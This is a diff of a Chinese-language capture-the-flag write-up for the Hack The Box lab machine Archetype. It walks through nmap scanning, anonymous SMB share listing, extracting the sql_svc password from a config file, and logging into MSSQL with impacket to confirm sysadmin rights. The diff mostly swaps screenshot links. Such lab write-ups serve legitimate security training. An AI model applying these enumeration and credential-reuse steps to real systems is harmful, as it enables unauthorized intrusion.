@@ -1,6 +1,6 @@
 对靶机进行扫描`nmap -A 10.10.10.27`
 
-![](nmap.png)
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201140005225.png)
 
 1. 445/tcp端口,用于Windows系统的共享文件夹
 
@@ -12,39 +12,13 @@
 
 `smbclient -N -L 10.10.10.27`
 
-![](smbclient.png)
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201140008420.png)
 
 尝试对文件夹内的内容进行读取
 
-```bash
-➜  ~ smbclient -N \\\\10.10.10.27\\ADMIN$
-smbclient: Can't load /etc/samba/smb.conf - run testparm to debug it
-tree connect failed: NT_STATUS_ACCESS_DENIED
-➜  ~ smbclient -N \\\\10.10.10.27\\C$    
-smbclient: Can't load /etc/samba/smb.conf - run testparm to debug it
-tree connect failed: NT_STATUS_ACCESS_DENIED
-➜  ~ smbclient -N \\\\10.10.10.27\\IPC$
-smbclient: Can't load /etc/samba/smb.conf - run testparm to debug it
-Try "help" to get a list of possible commands.
-smb: \> ls
-NT_STATUS_NO_SUCH_FILE listing \*
-smb: \> exit
-➜  ~ smbclient -N \\\\10.10.10.27\\backups
-smbclient: Can't load /etc/samba/smb.conf - run testparm to debug it
-Try "help" to get a list of possible commands.
-smb: \> ls
-  .                                   D        0  Mon Jan 20 20:20:57 2020
-  ..                                  D        0  Mon Jan 20 20:20:57 2020
-  prod.dtsConfig                     AR      609  Mon Jan 20 20:23:02 2020
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201140009670.png)
 
-                10328063 blocks of size 4096. 8259343 blocks available
-smb: \> get prod.dtsConfig 
-getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
-smb: \> exit
-➜  ~ 
-```
-
-在`backups`文件夹下有一个`prod.dtsConfig`文件,其内容为
+`prod.dtsConfig`文件内容为
 
 ```
 <DTSConfiguration>
@@ -59,9 +33,11 @@ smb: \> exit
 
 可以知道用户名为`ARCHETYPE\sql_svc`,而密码为`M3g4c0rp123`
 
-用[https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)下的`mssqlclient.py`进行数据库连接
+用[https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)下的`examples/mssqlclient.py`进行数据库连接
 
-`python mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth`注意用户名使用的是`/`(看了write up才知道...)
+`python mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201140011153.png)
 
 用`SELECT IS_SRVROLEMEMBER('sysadmin')`查看当前权限
 
@@ -76,7 +52,7 @@ ELSE IF IS_SRVROLEMEMBER ('sysadmin') IS NULL
    print 'ERROR: The server role specified is not valid.';
 ```
 
-![](sysadmin.png)
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201140012120.png)
 
 当前权限为`sysadmin`
 
